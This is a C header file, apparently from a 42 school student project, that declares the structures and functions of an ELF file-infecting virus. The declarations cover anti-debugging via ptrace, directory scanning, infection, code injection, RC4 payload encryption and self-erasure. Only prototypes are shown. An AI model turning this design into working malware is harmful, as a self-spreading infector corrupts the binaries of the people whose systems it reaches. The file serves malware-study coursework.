/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   death.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/22 20:59:10 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DEATH_H
# define DEATH_H

/* Includes */
# include <elf.h>
# include <stdio.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdlib.h>
# include <limits.h>
# include <stdbool.h>
# include <sys/time.h>
# include <sys/mman.h>
# include <sys/stat.h>
# include <sys/wait.h>
# include <sys/types.h>
# include <sys/random.h>
# include <sys/ptrace.h>
# include <sys/resource.h>

/* Enum */

/* Define */

# define SIGNATURE			0x216948	// 'Hi!'
# define ELF_MAGIC_NUMBER	1179403647

# define USER_ENTRY	2
# define ROOT_ENTRY	4
# define PROG_ENTRY	2
# define OC_ENTRY	8
# define KEY_SIZE	64

# define BUFF_SIZE	0x1000
# define PROG_INFO	512

/* /!\ To remove debug log, look at the Makefile /!\ */
# ifdef DEBUG
#  define ENTRY_OFF	2617
# else
#  define ENTRY_OFF	2302
# endif
/* /!\ To remove debug log, look at the Makefile /!\ */

# define __INLINE__	__attribute__((__always_inline__)) inline
# define __PACKED__ __attribute__ ((__packed__))

# define VERSION	"1.0"
# define CREATED_BY	"DTH version "VERSION" (c)oded by Jle-Quel & DjeDt"
# define CREATE_SZ	43

/* Structures */
typedef struct __PACKED__ linux_dirent64
{
	__ino64_t			d_ino;
	__off64_t			d_off;
	unsigned short int	d_reclen;
	unsigned char		d_type;
	char				d_name[256];
}						linux_dirent64;

typedef struct	s_directory
{
	int			entry;
	char		path[4][16];
}				t_directory;

typedef struct	s_key
{
	size_t		one;
	size_t		two;
	size_t		junk[2];
	void		*rsp;
}				t_key;

typedef struct	s_bin
{
	int			fd;
	int			pad;
	size_t		size;
	void		*map;
}				t_bin;

typedef struct	s_cypher
{
	Elf64_Phdr	*segment;
	Elf64_Shdr	*section;
	size_t		size;
}				t_cypher;

typedef struct	s_virus
{
	Elf64_Phdr	*data;
	Elf64_Phdr	*note;
	size_t		size;
}				t_virus;

typedef struct	s_data
{
	// core
	t_key		key;
	t_bin		bin;
	t_virus		virus;
	t_cypher	cypher;

	// memory
	Elf64_Ehdr	*header;
	Elf64_Addr	bin_entry;
	Elf64_Addr	vrs_entry;
	Elf64_Addr	cpr_entry;

	// misc
	void		*name;
	void		*rsp;
	uint8_t		cpr_key[KEY_SIZE];
	size_t		context;
}				t_data;

/* Core */
void			start(void);
void			antidebug(t_data *data);
void			opening(t_data *data);
void			death(t_data *data);
void			locate(t_data *data, t_directory *dir);
void			inspect(t_data *data, char *path);
void			infect(t_data *data);
void			inject(t_data *data);
void			patch(t_data *data, uint8_t *map, size_t size);
void			release(t_data *data);
void			erase(t_data *data);
void			end(t_data *data);

/*
**	Misc
*/
void			update_one(t_key *key, char *ptr, size_t size);
void			update_two(t_key *key, char *ptr, size_t size);
void			revert_one(t_key *key, char *ptr, size_t size);
void			revert_two(t_key *key, char *ptr, size_t size);
bool			generate_key(uint8_t *key, size_t size);

/*
**	Lib
*/
void			_rc4(const unsigned char *key, const size_t key_length, uint8_t *data, const size_t data_length);
void			*_memcpy(void *d, void *s, size_t size);
void			*_memset(void *b, int c, size_t len);
int				_strncmp(char *s1, char *s2, size_t n);
size_t			_strlen(char *s);
bool			check_name(char *str, int len);
int				_ptrace(long request, long pid ,unsigned long addr, unsigned long data);
void			_log(char *msg, char *name, size_t msgsize, size_t context);
pid_t			_fork(void);
int				_execve(const char *filename, char *const argv[], char *const envp[]);
int				_getppid(void);
pid_t			_wait4(pid_t pid, int *stat_addr, int options, struct rusage *ru);
void			__exit(int status);
int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int				_open(const char *path, int flags, mode_t mode);
int				_fstat(int fd, struct stat *statbuf);
int				_close(int fd);
void			*_mmap(void *addr, size_t len, int prot, size_t flags, size_t fd, off_t offset);
int				_munmap(void *addr, size_t len);
ssize_t			_read(int fd, void *buf, size_t len);
int				_write(int fd, const void *buf, size_t len);
int				_getuid(void);
int				_random_number(int limit);
ssize_t			_get_random(void *buf, size_t buflen, unsigned int flags);
void			end_of_data(void);

#endif
